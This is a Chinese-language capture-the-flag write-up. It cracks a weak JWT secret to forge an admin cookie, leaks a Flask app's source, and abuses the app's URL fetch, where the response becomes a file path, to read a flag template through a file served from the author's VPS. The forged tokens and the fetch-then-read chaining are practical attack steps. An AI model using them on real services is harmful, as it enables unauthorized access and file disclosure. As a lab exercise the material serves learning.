看到``Example is in "user/guest"``。

访问之后cookie有一个值``JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.Q9S_r1mW4nM967pR0halt7Ic6XKBPKlX3h85MOND8DQ``，拿到``jwt.io``解密可以看到payload部分``{"user":"guest"}``

把上面的jwt的值用 [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)跑一下，得到签名``C125``。把payload 里面user 改成admin，signature填C125，得到admin的JWT ``eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.8pL5ao-FlgweBhL0TnlRYS8U9gSK5SIsQze7lNWF1sw``

用edit this cookie换掉之前的jwt，访问 /user/admin，看到almost there。

抓个包看一下返回的头，有``Hint: user:developer``

访问 /user/developer ，得到base64编码的源代码

```
from flask import Flask, render_template, redirect, make_response, request
import re
import requests
app = Flask(__name__)

@app.route('/')
@app.route('/index')
def index():
    return render_template('index.html')

@app.route('/user/<name>')
def user(name):
    if name == 'developer':
        return render_template('sourcecode.html')
    if name == 'guest':
        response = make_response(render_template('user.html', name=name))
        response.set_cookie('JWT','eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.Q9S_r1mW4nM967pR0halt7Ic6XKBPKlX3h85MOND8DQ')
        return  response
    if name == 'admin' and request.cookies.get('JWT') == 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.8pL5ao-FlgweBhL0TnlRYS8U9gSK5SIsQze7lNWF1sw':
        try:
        	banlist = ['192','172','169']
            u = re.search(r'http://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',request.args['u'])
            if u == None or u.group(1) in banlist:
                redirect('/')
            t = requests.get(u.group()).text
            f = open(t,'r').read()
            return f
        except:
            # response = make_response(render_template('flag.html'))
            response = make_response(render_template('almostthere.html'))
            response.headers.set('Hint','user:developer')
            return response
    return redirect('/')
```

当admin登录成功时，会尝试访问参数u，u是一个IP地址，ban掉了192，172和169开头的地址

在自己的vps上写index.html，内容是``templates/flag.html``，这个位置是except那一段的注释中得出来的

在 vps 上面写文件的时候需要使用 python

```
with open('index.html','w') as f:
	f.write('templates/flag.html')
# 19
```

如果使用 vim 或者 ``echo 'templates/flag.html' > index.html``会自动产生一个换行符，requests.get 的时候会得到``template/flag.html\n``，导致读取失败